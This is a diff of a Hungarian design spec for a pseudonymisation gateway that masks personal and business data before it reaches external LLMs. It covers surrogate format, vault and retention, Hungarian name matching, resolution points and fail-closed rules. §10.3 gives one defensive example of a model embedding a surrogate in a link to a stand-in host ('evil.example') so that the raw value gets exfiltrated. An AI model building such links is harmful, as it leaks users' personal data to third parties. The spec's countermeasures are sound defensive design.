@@ -1,18 +1,19 @@
 # AI Privacy Gateway — koncepcióspecifikáció
 
-**Tokenizációs és detokenizációs réteg külső LLM-ek felé irányuló adatfolyamokhoz**
+**Pszeudonimizációs (tokenizációs) és feloldó réteg külső LLM-ek felé irányuló adatfolyamokhoz**
 
 | | |
 |---|---|
-| **Verzió** | v0.1 (forrás: `ai_privacy_gateway_specification_hu.html`) + A. melléklet: review-javaslatok (v0.2, **jóváhagyásra vár**) |
+| **Verzió** | **v0.2** — a v0.1 koncepció + a 2026-08-19-i review beépítve (R1–R23 elfogadva, D1–D6 eldöntve) |
 | **Státusz** | koncepció — nem implementált |
 | **Dátum** | 2026-08-19 |
-| **Kapcsolódó** | `docs/AI-Agent-Platform-Feature-Spec-Sensitivity-Router.md`, `docs/specs/sensitivity-router-redesign-spec.md`, issue #189 |
-| **Érintett kód** | `app/src/domain/gateway/model-gateway.ts`, `app/src/domain/gateway/sensitivity-router.ts`, `app/src/domain/tool-broker/`, `app/src/domain/agent/chat-tool-loop.ts`, `app/src/domain/channel/` |
+| **Issue** | #272 (ez a spec), #189 (beolvad, ld. D6) |
+| **Kapcsolódó spec** | `docs/AI-Agent-Platform-Feature-Spec-Sensitivity-Router.md`, `docs/specs/sensitivity-router-redesign-spec.md` |
+| **Érintett kód** | `app/src/domain/gateway/model-gateway.ts`, `app/src/domain/gateway/sensitivity-router.ts`, `app/src/domain/gateway/prompt-cache.ts`, `app/src/domain/tool-broker/`, `app/src/domain/contract-runtime/`, `app/src/domain/agent/chat-tool-loop.ts`, `app/src/domain/channel/` |
 
 **Cél:** a modellek és modellüzemeltetők felé történő érzékeny adatkitettség érdemi csökkentése úgy, hogy az AI agentek használhatósága és üzleti kontextusa a lehető legnagyobb mértékben megmaradjon.
 
-> **Olvasási sorrend:** az §1–18 a beérkezett koncepció (v0.1) változatlan tartalma. Az **A. melléklet** tartalmazza a review-t: a javasolt módosításokat (R1–R23) és a nyitott döntéseket (D1–D6). Az A. melléklet elfogadott pontjai kerülnek majd a v0.2 törzsszövegbe.
+> A v0.1 → v0.2 változások tételes listája a **§22 Változásnaplóban**.
 
 ---
 
@@ -20,64 +21,137 @@
 
 A rendszer nem teljes anonimizálást és nem új access-control réteget kíván létrehozni. A privacy boundary az AI Agent Platform megbízható környezete és a külső LLM között húzódik.
 
-> **Alapelv:** a tokenizáció azt szabályozza, hogy az LLM mit láthat; nem azt, hogy a felhasználó mit láthat.
+> **Alapelv:** a pszeudonimizáció azt szabályozza, hogy az LLM mit láthat; nem azt, hogy a felhasználó mit láthat.
 
-A user, a forrásalkalmazások, az AI Agent Platform, a token vault és a platform normál infrastruktúrája trusted zone. A külső LLM/API szolgáltató a privacy boundary túloldalán van.
+A user, a forrásalkalmazások, az AI Agent Platform, a surrogate vault és a platform normál infrastruktúrája trusted zone. A külső LLM/API szolgáltató a privacy boundary túloldalán van.
 
 A megoldás kockázatcsökkentő, best-effort rendszer. Nem ígéri, hogy egy LLM soha semmilyen azonosítható adatot nem láthat, hanem determinisztikusan védi azt, amiről a rendszer strukturálisan tudja, hogy védendő, és best-effort védi a bizonytalan, szabad szöveges eseteket.
 
-## 2. Fő architektúra
+**Jogi keret (R13).** A művelet a GDPR 4. cikk 5. pontja szerinti **pszeudonimizálás**, nem anonimizálás: a pszeudonimizált adat továbbra is személyes adat, a leképezés pedig az a „kiegészítő információ", amelyet elkülönítve, technikai és szervezési intézkedésekkel védve kell tartani. A réteg a 32. cikk szerinti megfelelő technikai intézkedés — **nem váltja ki** az LLM-szolgáltatóval kötött adatfeldolgozói szerződést, az adatkezelési tájékoztatót vagy a rekord-nyilvántartást.
+
+## 2. Viszony a meglévő sensitivity routerhez (R1)
+
+A platformban **már fut egy privacy-döntéspont** ugyanazon a hívásláncon. Ez a feature nem párhuzamos réteg, hanem annak kibővítése.
+
+| Meglévő elem | Hol | Mit csinál ma |
+|---|---|---|
+| `inspectPromptSensitivity` / `classifyPrompt` | `sensitivity-router.ts` | determinisztikus osztályozás (regex + Luhn + IBAN mod-97): `clean` / `sensitive` / `forbidden`, pozícióval és maszkolt snippettel |
+| Policy-végrehajtás | `model-gateway.ts` | `sensitive` → helyi modell kényszerítése (fail-closed, ha nincs helyi modell); `forbidden` → blokk + `model.call.denied` audit + emberi override |
+| Per-agent felmentés | `agents.allow_sensitive_external_model` | mindent-vagy-semmit kapcsoló, csak a `sensitive` szintre |
+| Kimenő redakció | `redactSensitiveText`, `StreamingSensitiveTextRedactor` | reasoning-trace és debug-export maszkolása — **egyirányú**, nem visszafejthető |
+
+**Kategória-szintű policy.** A privacy-döntés minden entitás-/mintakategóriára (`company`, `person`, `email`, `phone`, `account`, `taj`, `adoszam`, `pan`, `iban`, `secret_key`, tenant-egyedi minták) egy akciót ad:
+
+```
+allow | tokenize | local_only | block
+```
+
+- Ez váltja fel a mai `allow_sensitive_external_model` mindent-vagy-semmit kapcsolót (a kapcsoló migrációval kategória-policyvé képződik le).
+- A `secret_key` (privát kulcs, API token) **soha nem `tokenize`** — ott a pszeudonimizálásnak nincs üzleti értelme, marad `block`.
+- A `pan` / `iban` `allow` értéke superadmin-jog és külön megerősítés mögött marad (a mai `forbidden` invariáns nem gyengül).
+
+**Végrehajtási sorrend a gateway-ben.** A pszeudonimizáció **előbb** fut, az osztályozó a már pszeudonimizált szövegen dönt:
+
+```
+messages
+  │
+  ├─ 1. Privacy transform (ÚJ)      → surrogate-csere a policy szerint
+  │
+  ├─ 2. Sensitivity classify (MA)   → a maradékon: clean / sensitive / forbidden
+  │
+  ├─ 3. Guardrail + routing (MA)    → hívásszám-plafon, provider-feloldás
+  ▼
+external provider
+```
+
+Két haszna van: (a) nem keletkezik két, egymással versengő privacy-döntéspont; (b) megszűnik a redesign-spec P5 UX-csapdája — ma egyetlen e-mail-cím véglegesen `sensitive`-be billenti a beszélgetést, pszeudonimizálva viszont már nem.
+
+## 3. Fő architektúra (R20)
+
+Az elemek a meglévő modulokra képződnek le, nem új, párhuzamos komponensek:
 
 ```
 User / Source Systems
         │
         ▼
 Trusted AI Agent Platform
-  ├─ Connector / Privacy Interface
-  ├─ Entity Resolver (best effort)
-  ├─ Privacy Policy Engine
-  ├─ Token Engine
-  ├─ Token Vault / KMS
-  └─ LLM Privacy Gateway
-        │  raw → tokenized
+  ├─ Connector Privacy Metadata   → connector `config` / ConnectorSpecVersion capabilitySet
+  ├─ Entity Resolver (best effort)→ connector `resolve()` + tenant entitás-szótár
+  ├─ Privacy Policy Engine        → kategória-policy (PlatformSetting → tenant → agent)
+  ├─ Surrogate Engine + Vault/KMS → új modul: domain/privacy/
+  └─ Privacy transform            → ModelGateway.call() 1. lépése (§2)
+        │  raw → pszeudonimizált
         ▼
      External LLM
-        │  tokenized response
+        │  pszeudonimizált válasz / tool call
         ▼
 Trusted Platform
-        │  tokenized → raw
+        ├─ tool-arg feloldás      → ToolBrokerService.invoke() előtt (§10.1)
+        └─ megjelenítési feloldás → chat UI / channel adapter (§10.2)
         ▼
 User / Application UI
 ```
 
-A tokenizáció mechanikája platformszintű. A forrásrendszer domain tudást, mezőszintű privacy metadata-t, stabil belső azonosítókat és – ahol támogatott – entity resolution képességet ad.
+A mechanika platformszintű. A forrásrendszer domain tudást, mezőszintű privacy metadata-t, stabil belső azonosítókat és – ahol támogatott – entity resolution képességet ad.
 
-## 3. Felelősségi határok
+## 4. Felelősségi határok
 
 | Komponens | Felelősség |
 |---|---|
-| AI Agent Platform | Tokenformátum, tokenképzés, felismerés, validáció, scope, vault/KMS, LLM-bound adatfolyamok privacy transzformációja, detokenizáció vezérlése. |
+| AI Agent Platform | Surrogate-formátum, képzés, felismerés, validáció, scope, vault/KMS, LLM-bound adatfolyamok privacy transzformációja, feloldás vezérlése, egress-mátrix. |
 | Forrásrendszer / connector | Megjelöli a védendő strukturált mezőket, entitástípust és stabil source ID-t; opcionálisan entity resolutiont és privacy hint-eket biztosít. |
 | Forrásalkalmazás | Saját felhasználói jogosultságai és access control. Ezt a privacy gateway nem duplikálja. |
-| LLM | Opaque tokenekkel dolgozik; nem kap detokenizációs képességet. |
-| UI | A trusted oldalon a felhasználónak valódi adatot jeleníthet meg, és opcionálisan vizualizálja a privacy transzformációt. |
+| LLM | Kizárólag surrogate-okkal dolgozik; nem kap feloldó képességet, és nem kérhet feloldást. |
+| UI / channel adapter | A trusted oldalon a felhasználónak valódi adatot jeleníthet meg az egress-mátrix szerint, és opcionálisan vizualizálja a privacy transzformációt. |
 
-## 4. Tokenmodell
+## 5. Surrogate-modell
 
-- A token nem hordozza visszafejthető formában az eredeti adatot; opaque azonosító.
-- Formátuma egyértelműen felismerhető és verziózható, például `[[AITOK:v1:COMPANY:X7K2...]]`.
-- A platform validálja, hogy egy LLM által visszaadott token valóban létező, hiteles token-e; a modell által „kitalált" token nem oldható fel.
-- A belső entitásazonosság lehet tartós, de az LLM felé adott token alapértelmezésben conversation-scoped.
-- Ugyanaz az entitás külön beszélgetésekben eltérő külső tokent kaphat, csökkentve a beszélgetések közötti korrelálhatóságot.
-- A mapping hosszú ideig megőrizhető, hogy régi beszélgetések újranyitásakor a tokenek továbbra is feloldhatók legyenek.
+**Terminológia (R16).** A kódbázisban a „token" szó már négy dolgot jelent (LLM-token / `model_calls.prompt_tokens`, `WriteGateToken`, `ChannelLinkToken`, OAuth-token). A privacy-oldali helyettesítő neve ezért **surrogate** (magyarul: álnév), a leképezés `surrogate_map`, a modul `domain/privacy/`. A UI-ban „álnév" néven jelenik meg.
 
-### Vault és kulcskezelés
+**Formátum (R9, D1).** Opaque véletlen azonosító helyett **típusos, rövid, beszélgetésen belül sorszámozott** álnév:
 
-Első verzióban platformoldali vault/KMS javasolt, tenantonkénti erős izolációval. Későbbi enterprise opció lehet ügyfél- vagy forrásoldali kulcskezelés.
+```
+[[COMPANY_1]]   [[PERSON_2]]   [[EMAIL_3]]   [[ACCOUNT_1]]
+```
 
-## 5. Strukturált adatok tokenizálása
+Indok: az opaque karakterlánc (a) elveszíti az entitás típusát a modell számára, (b) sok BPE-tokent fogyaszt (költség + kontextusablak), (c) olvashatatlan a debug-nézetben. A típusos alak mindhármat javítja, és a modell a mondatszerkezetet is helyesen tudja felépíteni köré.
 
-Ez a legerősebb, determinisztikus védelmi réteg. A connector sémája jelzi, mely mezőket kell tokenizálni.
+**Opcionális kontextus-hint.** Policy-vezérelten az első előforduláskor egy nem azonosító típusleírás adható a modellnek (`COMPANY_1 = kiskereskedelmi lánc, HU`). Ez tudatos csere: kevés kontextus-szivárgás jobb válaszminőségért. Alapértelmezés: **kikapcsolva**; entitástípusonként engedélyezhető.
+
+**Hitelesség és névtér (R10).**
+
+- A leképezés `(tenantId, conversationId | traceId, entityRef) → surrogate` **bijektív** a scope-on belül.
+- A feloldás **kizárólag vault-találaton** múlik, soha nem a surrogate alakján — így a modell által „kitalált" álnév (`[[COMPANY_99]]`) definíció szerint feloldhatatlan.
+- A vault oldalán a rekord HMAC-cel hitelesített (tenant-kulcs); a HMAC **nem** kerül a surrogate szövegébe.
+- Ismeretlen álnév feloldási kísérlete `privacy.surrogate.unknown` audit-eseményt ír, és a §15 szerinti hibakezelést indítja.
+
+**Scope.** A belső entitásazonosság tartós, de a külső felé adott surrogate alapértelmezésben **conversation-scoped** (debug-trace esetén trace-scoped). Ugyanaz az entitás külön beszélgetésekben eltérő álnevet kap, csökkentve a beszélgetések közötti korrelálhatóságot. Egy beszélgetésen/trace-en belül a leképezés konzisztens.
+
+**Perzisztencia (R19).** A leképezés **perzisztens**, nem futásidejű memória. Enélkül a ticket-retry, az agent-turn resilience újrafuttatás és a beszélgetés újranyitása után az előzményben lévő korábbi álnevek feloldhatatlanná válnának. A mapping élettartamát a §6 retention szabályozza.
+
+## 6. Vault, kulcskezelés, retention
+
+**Kétféle surrogate-osztály (R2, D2).** A naiv „vault = értékmásolat" modell egy **második PII-példányt** hozna létre. Helyette:
+
+| Osztály | Mit tárol | Mikor keletkezik |
+|---|---|---|
+| **ref-surrogate** | csak referencia: `(tenantId, connectorId, entityType, sourceId)` — **nyers érték nélkül** | ha a connector stabil source ID-t ad (§7 fő eset) |
+| **val-surrogate** | titkosított értékmásolat (tenant-kulcs + per-conversation adatkulcs) | csak ha nincs source ID: szabad szöveges találat, user-input, NER (§8–9) |
+
+A ref-surrogate feloldása a forrásból (vagy a fordulón belül még meglévő nyers tool-válaszból) történik → nem növeli a PII-felületet, és a **forrásoldali törlés automatikusan átüt** a feloldáson (GDPR törlési jog).
+
+**Kulcskezelés.** Első verzióban platformoldali vault/KMS, tenantonkénti erős izolációval; per-conversation adatkulcs a val-surrogate-okhoz. Későbbi enterprise opció: ügyfél- vagy forrásoldali kulcskezelés (BYOK).
+
+**Retention és törlés (R15).** A meglévő sémára kötve, új retention-fogalom bevezetése nélkül:
+
+- a mapping élettartama a beszélgetés retention-jét követi: `RetentionPolicy`, `Conversation.retainUntil`, `Conversation.legalHold`;
+- beszélgetés törlésekor (`Message.contentDeletedAt` / retention-járat) a **per-conversation adatkulcs törlődik** → a val-surrogate-ok kriptográfiailag visszafejthetetlenné válnak (crypto-shredding);
+- a ref-surrogate eleve nem tárol értéket, így ott a forrásoldali törlés a mérvadó;
+- legal hold alatt álló beszélgetésnél a kulcs megmarad.
+
+## 7. Strukturált adatok pszeudonimizálása
+
+Ez a legerősebb, determinisztikus védelmi réteg. A connector sémája jelzi, mely mezőket kell pszeudonimizálni.
 
 ```json
 {
@@ -92,52 +166,109 @@ Ez a legerősebb, determinisztikus védelmi réteg. A connector sémája jelzi, 
 }
 ```
 
-A tool response még az LLM contextbe kerülés előtt áthalad a privacy gateway-en. A védendő mezők értéke helyett token kerül a modellhez, miközben a feladathoz szükséges nem védett üzleti adatok – például forgalmi számok – megmaradhatnak.
+A tool response még az LLM contextbe kerülés előtt áthalad a privacy transzformáción. A védendő mezők értéke helyett surrogate kerül a modellhez, miközben a feladathoz szükséges nem védett üzleti adatok – például forgalmi számok – megmaradhatnak.
 
-## 6. Szabad szöveg kezelése
+**Sorrend a contract-runtime-hoz képest (R6).** A tool-output szigorú séma-validációja (`domain/contract-runtime/`) a **nyers** válaszon fut; a pszeudonimizáció **utána**, közvetlenül a modell-hívás előtt. Enélkül egy `email` formátumú mezőbe tett `[[EMAIL_3]]` elbukna a formátum-validáción. További szabályok:
+
+- surrogate mindig **string mezőben** marad; numerikus és dátum mezőt nem pszeudonimizálunk (ott `pass` vagy `block`), mert az elrontja a downstream parszolást és a modell számtani érvelését;
+- a contract-runtime a pszeudonimizált mezőkre nem kényszerít formátum-constraintet (a transzformáció a validáció után történik, így ez természetesen adódik);
+- tömbök/ismétlődő rekordok esetén a mezőnkénti leképezés stabil marad a válaszon belül.
+
+## 8. Szabad szöveg kezelése
 
 Három egymásra épülő szint:
 
-1. **Schema-based tokenization:** strukturált mezőknél determinisztikus.
+1. **Schema-based:** strukturált mezőknél determinisztikus (§7).
 2. **Known-value substitution:** ha egy strukturált mezőből már ismert egy védett érték, ugyanazon adatcsomag szabad szövegében is lecserélhető.
-3. **NER/privacy scanner:** e-mail, note, dokumentumszöveg stb. esetén best-effort felismerés (pl. e-mail, telefon, személynév).
+3. **Privacy scanner:** e-mail, note, dokumentumszöveg stb. esetén best-effort felismerés a meglévő determinisztikus mintakészletre építve (e-mail, telefon, IBAN, PAN, TAJ, adószám) + tenant-egyedi minták.
 
-A harmadik szint hibája alapértelmezésben nem állítja meg a workflow-t. A cél a kitettség csökkentése, nem a használhatóság feláldozása.
+**Magyar nyelvi illesztés (R11, D4-hez kapcsolódóan).** A 2. szint nem lehet exact match: magyarul az entitásnév ragozódik (*SPAR-nak, SPAR-ral, Sparnál, a Sparban*). A v1 illesztés:
 
-## 7. User input és entity resolution
+- normalizálás (kisbetűsítés, ékezet-tűrés, elválasztójel-normalizálás),
+- toldalék-tolerancia (szótő + magyar ragmorféma-lista, kötőjeles toldalékolással),
+- szótár-illesztés Aho–Corasick automatával a tenant entitásnevein (skálázik több ezer névre),
+- szóhatár-ellenőrzés a hamis pozitívok ellen.
+
+**ML-alapú NER nélkül** — determinisztikus, olcsó (nulla LLM-token) és auditálható, összhangban a Sensitivity-Router spec elvével. ML-NER legfeljebb későbbi fázis, mérési eredmény alapján.
+
+A 3. szint hibája alapértelmezésben nem állítja meg a workflow-t (§15 fail-open szabály). A cél a kitettség csökkentése, nem a használhatóság feláldozása.
+
+## 9. User input és entity resolution
 
 A CRM-specializált agentnél indokolt, hogy a privacy resolver alapértelmezetten fusson. A prompt előtti entity recognition azonban best-effort.
 
 Példa: *„Készíts kimutatást a SPAR idei forgalmáról."*
 
-- Ha a resolver nagy bizonyossággal felismeri az entitást, a platform még az LLM előtt tokenre cseréli.
+- Ha a resolver nagy bizonyossággal felismeri az entitást, a platform még az LLM előtt surrogate-re cseréli.
 - A platform nem tart fenn minden connector minden entitásához globális alias-adatbázist.
-- A platform candidate extractiont végezhet, a tényleges feloldást pedig a forrásrendszer/connector `resolve()` interfésze végzi.
-- Ha a prompt előtti felismerés sikertelen, a nyers név továbbmehet az LLM-hez. Ez elfogadott best-effort leakage.
+- A platform candidate extractiont végez, a tényleges feloldást a forrásrendszer/connector `resolve()` interfésze adja.
+- Ha a prompt előtti felismerés sikertelen, a nyers név továbbmehet az LLM-hez. Ez **elfogadott, dokumentált maradékkockázat** (§16).
 
 ### Második védelmi vonal: tool boundary
 
-Ha az LLM később strukturált tool callban használja a nevet, például `get_revenue(company="SPAR")`, a platform újra megkísérli a forrásoldali feloldást. Siker esetén a tool művelet stabil source ID-val történik, és a beszélgetés további részében már token használható.
+Ha az LLM később strukturált tool callban használja a nevet — `get_revenue(company="SPAR")` —, a platform újra megkísérli a forrásoldali feloldást. Siker esetén a tool művelet stabil source ID-val történik, és a beszélgetés további részében már surrogate használható.
 
-> **Szabály:** user-input tokenizáció = best effort; strukturált tool-output tokenizáció = mandatory/deterministic, amennyiben a connector megfelelő privacy metadata-t biztosít.
+> **Szabály:** user-input pszeudonimizáció = best effort; strukturált tool-output pszeudonimizáció = mandatory/deterministic, amennyiben a connector megfelelő privacy metadata-t biztosít.
 
-## 8. Detokenizáció
+## 10. Feloldás (detokenizáció): hol szabad és hol nem
 
-Az LLM saját maga számára soha nem kérhet nyers értéket. A detokenizáció a trusted platform oldalon történik, tipikusan a végső UI/output rendereléskor.
+**Invariáns (R3).** Feloldás **pontosan két helyen** történhet, és soha nem az LLM kérésére:
 
-Nem épül külön token-access-control rendszer. Ha a felhasználó a forrásalkalmazás normál jogosultsági modellje szerint hozzáfér az adathoz, a token a számára feloldható. A privacy gateway nem másolja le a CRM vagy más source system jogosultsági rendszerét.
+### 10.1 Tool-argumentum feloldás
 
-## 9. Privacy Interface Contract csatlakoztatott rendszerekhez
+Ha az LLM tool callban adja vissza az álnevet — `get_revenue(company="[[COMPANY_1]]")` —, a platform a **connector-hívás előtt**, szerveroldalon feloldja (`ToolBrokerService.invoke()` előtt, a broker authorizer után). Enélkül minden pszeudonimizált entitáson elhasal a tool-hívás.
 
-A platform szabványos privacy interfészt definiál. A connectorok capability-alapon implementálhatják.
+- A feloldott nyers érték a tool-hívás argumentumába kerül, **nem** a modell contextjébe.
+- A tool-call audit (`ToolCall.argsMeta`) a surrogate-alakot naplózza, nem a nyers értéket.
+- Ismeretlen álnév → a tool-hívás kontrollált hibával tér vissza, a modell javíthat (§15).
+
+### 10.2 Megjelenítési feloldás — egress-mátrix (R4)
+
+A „trusted UI" nem az egyetlen kimenet: a platform Telegram-csatornán, platform e-mailben, ticket-kommentben, export/riport fájlban és debug-log exportban is kiad szöveget — ezek egy része a bizalmi határon **kívülre** megy. Alapértelmezett mátrix (tenant-szinten szigorítható):
+
+| Egress | Feloldás |
+|---|---|
+| Web UI (bejelentkezett, tenant-scope, jogosult résztvevő) | teljes |
+| Telegram / külső csatorna | entitástípusonként (D3): `company` engedhető, `person` / `email` / `account` alapból **nem** |
+| Platform e-mail-értesítés | alapból **nem** |
+| Export / riport fájl | policy szerint, auditált eseménnyel |
+| Debug-log export, audit log, model_calls napló | **soha** |
+
+### 10.3 Renderelési biztonság (R5)
+
+A pszeudonimizáció bevezetése **új exfiltrációs utat nyit**: ha a modell az álnevet URL-be, markdown-link célba vagy képhivatkozásba ágyazza (`https://evil.example/?c=[[COMPANY_1]]`), a naiv „cseréld vissza a végén" logika a nyers értéket teszi egy aktív linkbe, amit a felhasználó kattintása vagy egy auto-betöltő kép kivisz.
+
+Szabályok:
+
+- feloldás **csak szöveg-node-ban**; URL-ben, markdown-link célban, HTML-attribútumban és kódblokkban az álnév **jelölve marad** (és a UI jelzi, hogy ott feloldatlan érték van);
+- a markdown-renderelő sanitizálása (külső kép- és link-célok kezelése) előfeltétel;
+- a szabály megsértése regressziós teszttel fedett (red-line eset).
+
+### 10.4 Streaming feloldás (R8)
+
+A válasz SSE-deltákban érkezik, az álnév karakterei **több delta között szétszakadhatnak**. A feloldó ugyanazt a pufferelési mintát követi, amit a `StreamingSensitiveTextRedactor` már megvalósít: a `[[` nyitó szekvenciától a záró `]]`-ig visszatartás, korlátos pufferrel és a forduló végén ürítéssel. Töredék álnév soha nem jelenhet meg a felhasználónak.
+
+### 10.5 Feloldási scope-invariáns (R14)
+
+Nem építünk új jogosultsági modellt (§14 nem cél), de a vault-lookup nem lehet globálisan címezhető. Feloldás csak akkor engedélyezett, ha **mindhárom** teljesül:
+
+1. azonos tenant,
+2. azonos conversation/trace scope,
+3. a kérő felhasználó a beszélgetés jogosult résztvevője (a meglévő conversation-hozzáférés szerint).
+
+Ha a felhasználó a forrásalkalmazás jogosultsági modellje szerint nem fér hozzá az adathoz, azt továbbra is a forrásalkalmazás dönti el — a privacy gateway ezt nem duplikálja, csak a fenti három technikai feltételt kényszeríti ki.
+
+## 11. Privacy Interface Contract csatlakoztatott rendszerekhez
+
+A platform szabványos privacy interfészt definiál; a connectorok capability-alapon implementálják.
 
 ### Elvárt / ajánlott képességek
 
 - Védendő strukturált mezők deklarálása.
-- Entitástípus megadása: pl. `company`, `person`, `email`, `phone`, `account`.
-- Stabil belső/source azonosító biztosítása.
+- Entitástípus megadása: `company`, `person`, `email`, `phone`, `account`.
+- Stabil belső/source azonosító biztosítása (ez teszi lehetővé a ref-surrogate-ot, §6).
 - Opcionális privacy metadata és free-text hint-ek.
-- Opcionális `resolve(text, entity_type?)` interface, amely találatot, több találatot vagy nincs találat eredményt ad.
+- Opcionális `resolve(text, entity_type?)` interface: találat / több találat / nincs találat.
 - A tool API-k lehetőség szerint belső ID-val dolgozzanak, ne megjelenítési névvel.
 
 ### Capability deklaráció
@@ -151,46 +282,45 @@ A platform szabványos privacy interfészt definiál. A connectorok capability-a
 }
 ```
 
-Legacy vagy külső connector privacy interface nélkül is működhet, de a platform kisebb védelmi szintet jelez. A saját CRM lehet a teljes contract referenciaimplementációja.
+A deklaráció verziózott (a connector `ConnectorSpecVersion` capabilitySet-jébe illeszkedik), és a változása auditált. Legacy vagy külső connector privacy interface nélkül is működhet, de a platform kisebb védelmi szintet jelez a UI-ban és az auditban. A saját CRM a teljes contract referenciaimplementációja.
 
-## 10. Minden LLM-bound adatfolyam közös gateway-en
+## 12. Minden LLM-bound adatfolyam közös úton
 
-A privacy mechanizmus nem csak a normál agent contextre vonatkozik. Bármely adatfolyam, amely külső LLM-hez kerül, ugyanazon privacy gateway-en halad át.
+A privacy mechanizmus nem csak a normál agent contextre vonatkozik. Bármely adatfolyam, amely külső LLM-hez kerül, ugyanazon a transzformáción halad át:
 
-- Agent prompt/context
-- Tool response
-- Debugging trace és log projection
-- AI-alapú hibakeresés
-- Későbbi evaluation vagy elemző workflow-k
+- agent prompt/context (`user`, `assistant`, `tool` üzenetek),
+- **memória-chunkok** (ma `system` üzenetként injektálva) — **igen, ezek is** (D4): különben megmarad a redesign-spec P4 szerinti osztályozatlan rés,
+- tool response,
+- debugging trace és log projection,
+- AI-alapú hibakeresés,
+- későbbi evaluation vagy elemző workflow-k.
 
-A platform megtarthat teljes, nyers logokat a trusted zónában. Ha azonban egy debugging AI elemzi őket, egy `get_debug_trace()`-szerű API tokenizált projectiont ad az LLM számára. Nem szükséges külön privacy-log adatbázist fenntartani.
+**Tárolás nyersen, transzformáció a határon (R18).** A `messages`, `tool_calls` és log-rekordok a trusted zónában **nyersen** tárolódnak; a pszeudonimizáció minden fordulóban a kimenő határon fut újra, beszélgetés-szintű entitástérkép-cache-sel. Így a tárolt előzmény nem ragad be feloldhatatlan formában, és a §6 retention marad az egyetlen törlési mechanizmus.
 
-Egy trace-en belül ugyanaz az entitás konzisztensen ugyanazt a tokent kapja, hogy a debugging modell követni tudja az eseményláncot.
+**Prompt-cache invariáns (R7).** Conversation-scoped surrogate **nem kerülhet** megosztott, cache-elt prefixbe (skill-szöveg, közös rendszerinstrukció). A pszeudonimizált tartalom mindig a cache-határ **utáni**, nem megosztott szegmensben van. Ellenkező esetben cache-szennyezés és rossz feloldás keletkezik.
 
-## 11. Üzemmódok és rollout
+**Debug-trace.** A platform megtarthat teljes, nyers logokat a trusted zónában. Ha azonban egy debugging AI elemzi őket, a `get_debug_trace()`-szerű API pszeudonimizált projectiont ad. Nem szükséges külön privacy-log adatbázist fenntartani. Egy trace-en belül ugyanaz az entitás konzisztensen ugyanazt az álnevet kapja, hogy a debugging modell követni tudja az eseményláncot.
 
-A funkció könnyen ki- és bekapcsolható. Javasolt konfigurációs hierarchia:
+## 13. Üzemmódok és rollout
 
-- platform master switch;
-- tenant/szervezet default;
-- agent szintű override.
+Konfigurációs hierarchia: **platform master switch → tenant/szervezet default → agent szintű override** (a meglévő `PlatformSetting` kill-switch mintára).
 
 | Mód | Viselkedés |
 |---|---|
 | **OFF** | A privacy transzformáció nem fut. |
-| **OBSERVE / DRY-RUN** | A rendszer megállapítja és logolja, mit tokenizálna, de az LLM-bound adatot nem módosítja. |
+| **OBSERVE / DRY-RUN** | A rendszer megállapítja és logolja, mit pszeudonimizálna, de az LLM-bound adatot nem módosítja. |
 | **ENFORCE** | A konfigurált privacy transzformáció ténylegesen érvényesül. |
 
-Ez lehetővé teszi a fokozatos pilotot, regressziótesztet és gyors visszaállást, ha a modul egy workflow-t akadályoz.
+Ez lehetővé teszi a fokozatos pilotot, a regressziótesztet és a gyors visszaállást, ha a modul egy workflow-t akadályoz. A kategória-policy (§2) minden módban ugyanaz; a mód csak azt szabályozza, hogy a döntés érvényesül-e.
 
-## 12. Privacy Observability és vizuális debugging
+## 14. Privacy Observability és vizuális debugging
 
-A UI opcionálisan megjelölheti azokat a természetes nyelvi részleteket, amelyek az LLM felé tokenizálva mentek vagy OBSERVE módban tokenizálva mentek volna.
+A UI opcionálisan megjelölheti azokat a természetes nyelvi részleteket, amelyek az LLM felé pszeudonimizálva mentek, vagy OBSERVE módban mentek volna:
 
-- A user a valódi értéket látja, például „SPAR Magyarország".
-- Szín/kiemelés jelzi a védett entitást.
-- Hover vagy debug panel mutathatja az entitástípust és a transzformáció státuszát.
-- Normál usernek nem szükséges a technikai token megjelenítése.
+- a user a valódi értéket látja, például „SPAR Magyarország";
+- szín/kiemelés jelzi a védett entitást;
+- hover vagy debug panel mutatja az entitástípust és a transzformáció státuszát;
+- normál usernek nem szükséges a technikai álnév megjelenítése.
 
 Admin/debug nézetben hasznos lánc:
 
@@ -203,259 +333,181 @@ Actual LLM input
    ↓
 LLM output
    ↓
-Detokenized user output
+Feloldott user output
 ```
 
-OBSERVE módban ez a felület alkalmas false positive és false negative esetek gyors felderítésére.
+OBSERVE módban ez a felület alkalmas a false positive és false negative esetek gyors felderítésére. A meglévő `inspectPromptSensitivity` már ma maszkolt snippetet és pozíciót ad vissza — a felület erre építhető.
 
-## 13. Hibakezelési alapelvek
+## 15. Hibakezelés, latency, fail-open / fail-closed
 
-- A rendszer lehetőleg degradálódjon, ne omoljon össze.
+**Alapelvek.**
+
+- A rendszer degradálódjon, ne omoljon össze.
 - A bizonytalan user-input felismerés ne okozzon folyamatos hibaüzeneteket.
-- Nem létező vagy sérült token nem detokenizálható; a platform validálja és szükség esetén kontrolláltan újrapróbálhatja/korrigáltathatja a modell outputját.
-- A strukturált, explicit módon védendő source mezők tokenizálásának hibája erősebb policy-t igényelhet, mint a best-effort NER hibája.
-- A fail-open / fail-closed viselkedés később policy-szinten konfigurálható lehet, különösen magas biztonsági igényű tenantoknál.
+- Nem létező vagy sérült álnév nem oldható fel; a platform validálja, auditálja (`privacy.surrogate.unknown`), és szükség esetén kontrolláltan visszajelez a modellnek javításra.
+- Minden privacy-esemény a hash-láncolt auditba kerül: kategória, akció, érintett spanek száma, scope — **soha a nyers érték**.
 
-## 14. Nem célok
+**Latency-budget (R12).** A transzformáció a kritikus úton van, nagy tool-válaszoknál (több ezer soros CRM-lista) érzékelhető:
+
+- célérték: **p95 ≤ 50 ms / 100 KB szöveg**, teljes forduló-overhead p95 ≤ 80 ms;
+- vault-írás fordulónként batchelve, egy tranzakcióban;
+- beszélgetés-szintű entitástérkép-cache (a history append-only, így a már feldolgozott prefix eredménye újrahasznosítható).
+
+**Timeout / hiba esetén (R12) — ez válaszolja meg a v0.1 §17 nyitott fail-open kérdését:**
+
+| Réteg | Viselkedés hibánál |
+|---|---|
+| Strukturált, explicit módon jelölt mező (§7) | **fail-closed** — a modellhívás megáll, audit + emberi visszajelzés. Inkább hibázzon, mint hogy nyersen kimenjen. |
+| Known-value substitution (§8/2) | fail-closed, ha a forrásérték strukturált mezőből származik; egyébként fail-open. |
+| Best-effort scanner / user-input resolver (§8/3, §9) | **fail-open** + audit — a workflow nem áll meg. |
+| Vault elérhetetlen | fail-closed minden pszeudonimizált útra (a feloldás sem működne). |
+
+## 16. Fenyegetésmodell és maradékkockázat (R21)
+
